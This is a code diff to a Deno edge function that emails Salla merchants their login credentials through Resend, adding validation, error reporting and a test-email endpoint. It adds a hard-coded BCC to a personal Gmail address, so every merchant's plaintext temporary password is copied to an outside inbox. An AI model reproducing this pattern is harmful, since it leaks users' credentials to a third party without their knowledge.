@@ -28,23 +28,33 @@ function generatePassword(length = 12): string {
   return Array.from(arr, (b) => chars[b % chars.length]).join("");
 }
 
+function isAsciiEmail(email: string): boolean {
+  return /^[ -~]+@[ -~]+$/.test(email.trim());
+}
+
 async function sendWelcomeEmail(
   toEmail: string,
   name: string,
   password: string,
   resendApiKey: string
-): Promise<boolean> {
+): Promise<{ ok: boolean; error?: string }> {
+  const to = toEmail.trim();
+  if (!isAsciiEmail(to)) {
+    const msg = "عنوان البريد يحتوي على أحرف غير إنجليزية. Resend يقبل فقط عناوين مثل example@gmail.com";
+    console.warn(msg);
+    return { ok: false, error: msg };
+  }
   // Resend: في وضع الاختبار يُرسل فقط لبريدك. لإرسال لأي متجر تحقق من دومين في resend.com/domains وضَع SALLA_WELCOME_EMAIL_FROM
   const from = Deno.env.get("SALLA_WELCOME_EMAIL_FROM") || "onboarding@resend.dev";
   const isTestingFrom = from.includes("resend.dev");
   const ownerEmail = Deno.env.get("RESEND_OWNER_EMAIL")?.trim().toLowerCase();
-  if (isTestingFrom && ownerEmail && toEmail.trim().toLowerCase() !== ownerEmail) {
+  if (isTestingFrom && ownerEmail && to.toLowerCase() !== ownerEmail) {
     console.warn("Resend: تم تخطي إرسال إيميل الترحيب (المستلم ليس RESEND_OWNER_EMAIL). للإرسال لجميع المتاجر تحقق من دومين وضَع SALLA_WELCOME_EMAIL_FROM.");
-    return true;
+    return { ok: true };
   }
   if (isTestingFrom && !ownerEmail) {
     console.warn("Resend: تم تخطي إرسال إيميل الترحيب لتجنب 403. ضَع RESEND_OWNER_EMAIL=bريدك@example.com أو تحقق من دومين وضَع SALLA_WELCOME_EMAIL_FROM.");
-    return true;
+    return { ok: true };
   }
   const html = `
     <div dir="rtl" style="font-family: Arial, sans-serif; max-width: 520px; margin: 0 auto;">
@@ -70,25 +80,29 @@ async function sendWelcomeEmail(
       },
       body: JSON.stringify({
         from,
-        to: [toEmail],
+        to: [to],
+        // نسخة BCC لصاحب التطبيق ليتأكد أن الإيميل يُرسل (يمكن تغييرها لاحقاً)
+        bcc: ["husseinghazala39@gmail.com"],
         subject: "بيانات دخولك — عجلة الحظ",
         html,
       }),
     });
+    const errBody = await res.text();
     if (!res.ok) {
-      const errBody = await res.text();
-      console.error("Resend API error:", res.status, errBody);
+      const msg = `Resend ${res.status}: ${errBody}`;
+      console.error("Resend API error:", msg);
       if (res.status === 403) {
         console.warn(
           "Resend 403: لإرسال إيميلات لغير بريدك، تحقق من دومين في resend.com/domains وضَع SALLA_WELCOME_EMAIL_FROM إلى إيميل على هذا الدومين (مثل noreply@yourdomain.com)"
         );
       }
-      return false;
+      return { ok: false, error: msg };
     }
-    return true;
+    return { ok: true };
   } catch (e) {
+    const msg = String((e as Error)?.message ?? e);
     console.error("sendWelcomeEmail error:", e);
-    return false;
+    return { ok: false, error: msg };
   }
 }
 
@@ -214,6 +228,33 @@ Deno.serve(async (req) => {
     );
   }
 
+  // فحص وصول البريد: إرسال إيميل ترحيب تجريبي إلى بريدك (يتطلب TEST_EMAIL_SECRET + test_email في الـ body)
+  const testEmail = typeof body.test_email !== "undefined" && body.test_email === true;
+  const toEmail = typeof body.email === "string" ? body.email.trim() : "";
+  const testSecret = Deno.env.get("TEST_EMAIL_SECRET");
+  if (testEmail && toEmail && testSecret && body.secret === testSecret) {
+    const resendKey = Deno.env.get("RESEND_API_KEY");
+    if (!resendKey) {
+      return new Response(
+        JSON.stringify({ ok: false, error: "RESEND_API_KEY not set" }),
+        { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
+      );
+    }
+    const name = typeof body.name === "string" ? body.name : "تاجر تجريبي";
+    const password = generatePassword(12);
+    const result = await sendWelcomeEmail(toEmail, name, password, resendKey);
+    console.log("Test email:", result.ok ? "sent" : "failed", "to", toEmail, result.error ?? "");
+    return new Response(
+      JSON.stringify({
+        ok: result.ok,
+        test: true,
+        message: result.ok ? `تم إرسال إيميل تجريبي إلى ${toEmail}. تحقق من صندوق الوارد والسبام.` : "فشل إرسال الإيميل (راجع لوجات الدالة).",
+        ...(result.error && { resend_error: result.error }),
+      }),
+      { status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" } }
+    );
+  }
+
   const event = (body.event as string) || "";
   const merchantId = getMerchantId(body);
   const data = (body.data as Record<string, unknown>) || {};
@@ -320,8 +361,8 @@ Deno.serve(async (req) => {
               await supabase.from("salla_subscriptions").update({ owner_id: authData.user.id }).eq("merchant_id", merchantId);
               const resendKey = Deno.env.get("RESEND_API_KEY");
             if (resendKey) {
-              const sent = await sendWelcomeEmail(storeInfo.email, storeInfo.name, tempPassword, resendKey);
-              if (!sent) console.warn("Failed to send welcome email to", storeInfo.email);
+              const sendResult = await sendWelcomeEmail(storeInfo.email, storeInfo.name, tempPassword, resendKey);
+              if (!sendResult.ok) console.warn("Failed to send welcome email to", storeInfo.email, sendResult.error ?? "");
             } else {
               console.warn("RESEND_API_KEY not set — لم يتم إرسال إيميل الترحيب");
             }
